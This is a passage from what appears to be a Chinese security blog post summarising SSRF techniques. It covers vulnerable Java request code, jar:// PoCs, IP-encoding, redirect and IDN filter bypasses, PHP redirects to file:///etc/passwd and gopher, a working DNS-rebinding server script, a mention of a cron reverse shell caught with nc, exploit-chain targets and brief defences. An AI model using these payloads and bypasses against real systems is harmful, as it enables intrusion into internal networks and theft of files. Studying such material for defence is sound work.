+<p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p>
+</blockquote>
+<h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p>
+<p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p>
+<h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/4.png" alt=""></p>
+<p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p>
+<p>而实际上有攻击利用价值的仅为file和http/https协议。</p>
+<h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p>
+<ul>
+<li>HttpClient类</li>
+<li>HttpURLConnection类</li>
+<li>URLConnection类</li>
+<li>URL类</li>
+<li>OkHttp类</li>
+<li>ImageIO类</li>
+<li>Request类</li>
+</ul>
+<p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure>
+<p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p>
+<ul>
+<li>HttpClient类</li>
+<li>HttpURLConnection类</li>
+<li>OkHttp类</li>
+<li>Request类</li>
+</ul>
+<p>支持<code>sun.net.www.protocol</code>所有协议的类：</p>
+<ul>
+<li>URLConnection类</li>
+<li>URL类</li>
+<li>ImageIO类</li>
+</ul>
+<h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p>
+<p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p>
+<h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure>
+<h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>
+<h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure>
+<h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure>
+<h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure>
+<p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure>
+<p>jar://协议分类：</p>
+<ul>
+<li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li>
+<li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li>
+<li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li>
+</ul>
+<p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p>
+<p>比如下面的poc是获取目标jar包内C3P0.class文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p>
+<p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p>
+<h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
+<h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p>
+<h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p>
+<h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p>
+<p>而此时实际访问的是<code>http://10.10.10.100</code>。</p>
+<h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p>
+<ul>
+<li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li>
+<li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+<li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+</ul>
+<p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p>
+<ul>
+<li>8进制格式：0300.0250.0.1</li>
+<li>16进制格式：0xC0.0xA8.0.1</li>
+<li>16进制整数格式：0xC0A80001</li>
+<li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li>
+</ul>
+<p>其他特殊形式：</p>
+<ul>
+<li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li>
+<li>0.0.0.0可以直接访问到本地；</li>
+</ul>
+<h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p>
+<ul>
+<li>10.0.0.1.xip.io</li>
+<li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li>
+<li>mysite.10.0.0.1.xip.io</li>
+<li>foo.bar.10.0.0.1.xip.io</li>
+</ul>
+<h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote>
+<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p>
+</blockquote>
+<h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote>
+<p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
+</blockquote>
+<h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote>
+<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>
+<p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>
+<p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p>
+</blockquote>
+<p>跳转常见的结合协议的方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p>
+<p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p>
+<h4 id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
+<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
+<ul>
+<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
+<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
+<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
+<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
+</ul>
+<h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p>
+<h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p>
+<p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p>
+<p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+<h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p>
+<p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p>
+<h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p>
+<h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p>
+<h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p>
+<h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul>
+<li>Apache Hadoop远程命令执行</li>
+<li>axis2-admin部署Server命令执行</li>
+<li>Confluence SSRF</li>
+<li>counchdb WEB API远程命令执行</li>
+<li>dict</li>
+<li>docker API远程命令执行</li>
+<li>Elasticsearch引擎Groovy脚本命令执行</li>
+<li>ftp / ftps（FTP爆破）</li>
+<li>glassfish任意文件读取和war文件部署间接命令执行</li>
+<li>gopher</li>
+<li>HFS远程命令执行</li>
+<li>http、https</li>
+<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>
+<li>Java调试接口命令执行</li>
+<li>JBOSS远程Invoker war命令执行</li>
+<li>Jenkins Scripts接口命令执行</li>
+<li>ldap</li>
+<li>mongodb</li>
+<li>php_fpm/fastcgi 命令执行</li>
+<li>rtsp - smb/smbs（连接SMB）</li>
+<li>sftp</li>
+<li>ShellShock命令执行</li>
+<li>Struts2 RCE</li>
+<li>telnet</li>
+<li>tftp（UDP协议扩展）</li>
+<li>tomcat命令执行</li>
+<li>WebDav PUT上传任意文件</li>
+<li>WebSphere Admin可部署war间接命令执行</li>
+<li>zentoPMS远程命令执行</li>
+</ul>
+<h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul>
+<li>限制协议为http/https，禁用不必要的协议；</li>
+<li>尽量禁止30x跳转；</li>
+<li>设置URL白名单或限制内网IP、限制请求的端口等；</li>
+<li>统一错误信息；</li>
+<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li>
+</ul>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p>
+<p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
